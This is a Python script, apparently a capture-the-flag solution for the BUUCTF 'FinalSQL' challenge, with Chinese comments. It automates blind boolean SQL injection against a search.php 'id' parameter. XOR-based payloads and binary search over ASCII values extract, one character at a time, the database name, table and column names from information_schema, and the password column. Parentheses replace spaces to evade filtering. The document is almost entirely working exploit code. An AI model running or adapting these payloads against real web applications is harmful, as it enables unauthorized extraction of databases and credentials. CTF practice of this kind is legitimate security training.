import requests
import time

url_base = "http://a4ad5273-57f7-45a3-ab11-527a8d9f3097.node5.buuoj.cn:81/search.php?id=" 
sleep_time = 0.1

def check_resp(response_text):
    # 逻辑：1^0 (条件为假) -> 页面显示 Click others
    if 'Click others' in response_text:
        return True 
    return False

def sql_inject(query_payload):
    result = ""
    print(f"[*] 正在提取: {query_payload}")
    
    #range控制最大长度
    for i in range(1, 250): 
        low = 32
        high = 127
        mid = (low + high) // 2
        
        while low <= high:
            # 构造 Payload： id=1^(ascii(substr((SQL),i,1))>mid)
            # FinalSQL 经常过滤空格，所以用括号包裹
            temp_payload = f"1^(ascii(substr(({query_payload}),{i},1))>{mid})"
            target_url = url_base + temp_payload
            
            try:
                r = requests.get(target_url, timeout=5)
                # print(f"测试: {mid} -> 长度: {len(r.text)}") # 调试用
                
                if check_resp(r.text):
                    # 页面显示 Click others -> 1^0 -> 条件(>mid)为假 -> 实际值 <= mid
                    high = mid - 1
                else:
                    # 页面显示 ERROR -> 1^1 -> 条件(>mid)为真 -> 实际值 > mid
                    low = mid + 1
                    
                mid = (low + high) // 2
                time.sleep(sleep_time)
                
            except Exception as e:
                print(f"[-] 连接错误: {e}")
                break
        
        if mid <= 32 or mid >= 127:
            break
            
        # 二分结束，low 就是目标字符的 ASCII 码
        result += chr(low)
        print(f"\rFound: {result}", end="")
        
    print(f"\n[+] 最终结果: {result}")
    return result

if __name__ == "__main__":
    print("=== 开始 BUUCTF FinalSQL 注入 ===")
    
    # 第1步：跑库名
    #db_name = sql_inject("database()")
    
    # 第2步：跑表名
    #table_payload = f"select(group_concat(table_name))from(information_schema.tables)where(table_schema='{'geek'}')"
    #sql_inject(table_payload)

    # 第3步：跑列名
    #column_payload = f"select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')"
    #sql_inject(column_payload)

    # 第4步：跑数据
    flag_payload = f"select(group_concat(password))from(F1naI1y)"
    sql_inject(flag_payload)